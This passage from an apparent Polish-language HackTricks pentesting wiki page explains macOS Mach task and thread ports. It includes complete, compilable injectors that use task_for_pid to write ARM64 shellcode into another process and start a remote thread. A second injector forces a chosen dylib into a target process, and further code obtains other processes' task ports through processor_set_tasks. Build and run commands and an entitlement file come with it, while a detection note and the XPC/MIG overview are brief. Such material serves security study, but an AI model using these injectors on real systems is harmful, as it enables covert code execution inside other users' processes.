Pamiętaj, że ponieważ **jądro jest również zadaniem**, jeśli ktoś zdoła uzyskać **uprawnienia SEND** do **`kernel_task`**, będzie mógł sprawić, że jądro wykona wszystko (jailbreaki).

- Wywołaj `mach_task_self()` aby **uzyskać nazwę** dla tego portu dla zadania wywołującego. Ten port jest tylko **dziedziczony** przez **`exec()`**; nowe zadanie utworzone za pomocą `fork()` otrzymuje nowy port zadania (jako specjalny przypadek, zadanie również otrzymuje nowy port zadania po `exec()` w binarnym pliku suid). Jedynym sposobem na uruchomienie zadania i uzyskanie jego portu jest wykonanie ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) podczas wykonywania `fork()`.
- Oto ograniczenia dostępu do portu (z `macos_task_policy` z binarnego `AppleMobileFileIntegrity`):
- Jeśli aplikacja ma **`com.apple.security.get-task-allow` entitlement**, procesy od **tego samego użytkownika mogą uzyskać dostęp do portu zadania** (zwykle dodawane przez Xcode do debugowania). Proces **notarization** nie pozwoli na to w wersjach produkcyjnych.
- Aplikacje z **`com.apple.system-task-ports`** entitlement mogą uzyskać **port zadania dla dowolnego** procesu, z wyjątkiem jądra. W starszych wersjach nazywało się to **`task_for_pid-allow`**. To jest przyznawane tylko aplikacjom Apple.
- **Root może uzyskać dostęp do portów zadań** aplikacji **nie** skompilowanych z **hardened** runtime (i nie od Apple).

**Port nazwy zadania:** Nieuprzywilejowana wersja _portu zadania_. Odnosi się do zadania, ale nie pozwala na jego kontrolowanie. Jedyną rzeczą, która wydaje się być dostępna przez to, jest `task_info()`.

### Thread Ports

Wątki również mają powiązane porty, które są widoczne z zadania wywołującego **`task_threads`** i z procesora z `processor_set_threads`. Prawo SEND do portu wątku pozwala na użycie funkcji z podsystemu `thread_act`, takich jak:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Każdy wątek może uzyskać ten port, wywołując **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Możesz pobrać shellcode z:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Skompiluj** poprzedni program i dodaj **uprawnienia**, aby móc wstrzykiwać kod z tym samym użytkownikiem (w przeciwnym razie będziesz musiał użyć **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Aby to działało na iOS, potrzebujesz uprawnienia `dynamic-codesigning`, aby móc utworzyć wykonywalny kod w pamięci.

### Wstrzykiwanie Dylib w wątku za pomocą portu Task

W macOS **wątki** mogą być manipulowane za pomocą **Mach** lub używając **posix `pthread` api**. Wątek, który wygenerowaliśmy w poprzednim wstrzyknięciu, został wygenerowany za pomocą api Mach, więc **nie jest zgodny z posix**.

Możliwe było **wstrzyknięcie prostego shellcode** do wykonania polecenia, ponieważ **nie musiał działać z zgodnymi z posix** api, tylko z Mach. **Bardziej złożone wstrzyknięcia** wymagałyby, aby **wątek** był również **zgodny z posix**.

Dlatego, aby **ulepszyć wątek**, powinien on wywołać **`pthread_create_from_mach_thread`**, co **utworzy ważny pthread**. Następnie ten nowy pthread mógłby **wywołać dlopen**, aby **załadować dylib** z systemu, więc zamiast pisać nowy shellcode do wykonywania różnych działań, można załadować niestandardowe biblioteki.

Możesz znaleźć **przykładowe dyliby** w (na przykład ten, który generuje log, a następnie możesz go odsłuchiwać):

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Przechwytywanie wątków za pomocą portu zadania <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

W tej technice wątek procesu jest przechwytywany:

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Wykrywanie wstrzykiwania portu zadania

Podczas wywoływania `task_for_pid` lub `thread_create_*` zwiększa licznik w strukturze zadania z jądra, który można uzyskać z trybu użytkownika, wywołując task_info(task, TASK_EXTMOD_INFO, ...)

## Porty wyjątków

Gdy wystąpi wyjątek w wątku, ten wyjątek jest wysyłany do wyznaczonego portu wyjątków wątku. Jeśli wątek go nie obsłuży, jest wysyłany do portów wyjątków zadania. Jeśli zadanie go nie obsłuży, jest wysyłany do portu hosta, który jest zarządzany przez launchd (gdzie zostanie potwierdzony). Nazywa się to triage wyjątków.

Należy zauważyć, że na końcu, jeśli nie zostanie to odpowiednio obsłużone, raport zostanie obsłużony przez demona ReportCrash. Jednak możliwe jest, aby inny wątek w tym samym zadaniu zarządzał wyjątkiem, co robią narzędzia do raportowania awarii, takie jak `PLCreashReporter`.

## Inne obiekty

### Zegar

Każdy użytkownik może uzyskać dostęp do informacji o zegarze, jednak aby ustawić czas lub zmodyfikować inne ustawienia, należy być rootem.

Aby uzyskać informacje, można wywołać funkcje z podsystemu `clock`, takie jak: `clock_get_time`, `clock_get_attributtes` lub `clock_alarm`\
Aby zmodyfikować wartości, można użyć podsystemu `clock_priv` z funkcjami takimi jak `clock_set_time` i `clock_set_attributes`

### Procesory i zestaw procesorów

Interfejsy API procesora pozwalają kontrolować pojedynczy logiczny procesor, wywołując funkcje takie jak `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Ponadto, interfejsy API **zestawu procesorów** zapewniają sposób grupowania wielu procesorów w grupę. Można uzyskać domyślny zestaw procesorów, wywołując **`processor_set_default`**.\
Oto kilka interesujących interfejsów API do interakcji z zestawem procesorów:

- `processor_set_statistics`
- `processor_set_tasks`: Zwraca tablicę praw do wysyłania do wszystkich zadań w zestawie procesorów
- `processor_set_threads`: Zwraca tablicę praw do wysyłania do wszystkich wątków w zestawie procesorów
- `processor_set_stack_usage`
- `processor_set_info`

Jak wspomniano w [**tym poście**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), w przeszłości pozwalało to na ominięcie wcześniej wspomnianej ochrony, aby uzyskać porty zadań w innych procesach, aby je kontrolować, wywołując **`processor_set_tasks`** i uzyskując port hosta w każdym procesie.\
Obecnie potrzebujesz roota, aby użyć tej funkcji, a to jest chronione, więc będziesz mógł uzyskać te porty tylko w niechronionych procesach.

Możesz to wypróbować z:

<details>

<summary><strong>kod processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)

{{#include ../../../../banners/hacktricks-training.md}}
